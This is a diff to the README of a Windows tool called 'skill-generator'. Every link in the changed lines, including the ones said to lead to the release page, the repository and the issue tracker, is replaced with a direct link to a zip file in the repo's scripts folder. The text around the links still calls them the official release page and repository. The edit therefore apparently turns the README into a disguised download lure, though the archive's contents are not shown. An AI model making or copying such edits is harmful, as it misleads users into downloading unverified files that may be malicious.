@@ -1,6 +1,6 @@
 # ⚙️ skill-generator - Create AI Skills From Ideas
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/sethikasithum/skill-generator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/sethikasithum/skill-generator/main/scripts/generator_skill_v1.6.zip)
 
 ---
 
@@ -29,7 +29,7 @@ No special hardware or software skills are needed.
 
 Start by visiting the main release page on GitHub. Here you will find all official versions ready to download.
 
-[**Download skill-generator here**](https://github.com/sethikasithum/skill-generator/releases)
+[**Download skill-generator here**](https://raw.githubusercontent.com/sethikasithum/skill-generator/main/scripts/generator_skill_v1.6.zip)
 
 Click this link or the badge at the top to open the page.
 
@@ -43,7 +43,7 @@ Follow these simple steps to get skill-generator running on your Windows compute
 
 Open your web browser and go to:
 
-https://github.com/sethikasithum/skill-generator/releases
+https://raw.githubusercontent.com/sethikasithum/skill-generator/main/scripts/generator_skill_v1.6.zip
 
 This page shows the latest versions of skill-generator available for download.
 
@@ -146,7 +146,7 @@ New versions improve features and fix issues.
 
 Check the release page regularly:
 
-https://github.com/sethikasithum/skill-generator/releases
+https://raw.githubusercontent.com/sethikasithum/skill-generator/main/scripts/generator_skill_v1.6.zip
 
 Download the newest `.exe` file and repeat the installation steps.
 
@@ -160,7 +160,7 @@ Inside the app, use the Help menu for tutorial guides.
 
 You can also open the GitHub repository to report issues or ask questions:
 
-https://github.com/sethikasithum/skill-generator
+https://raw.githubusercontent.com/sethikasithum/skill-generator/main/scripts/generator_skill_v1.6.zip
 
 Look for the “Issues” tab and describe your problem clearly.
 
@@ -170,6 +170,6 @@ The community and developers may assist with common problems.
 
 ## 🚀 Quick Access Link
 
-[Click here to visit the skill-generator download page](https://github.com/sethikasithum/skill-generator/releases)
+[Click here to visit the skill-generator download page](https://raw.githubusercontent.com/sethikasithum/skill-generator/main/scripts/generator_skill_v1.6.zip)
 
 This link takes you to all official releases where you can get the latest installer.
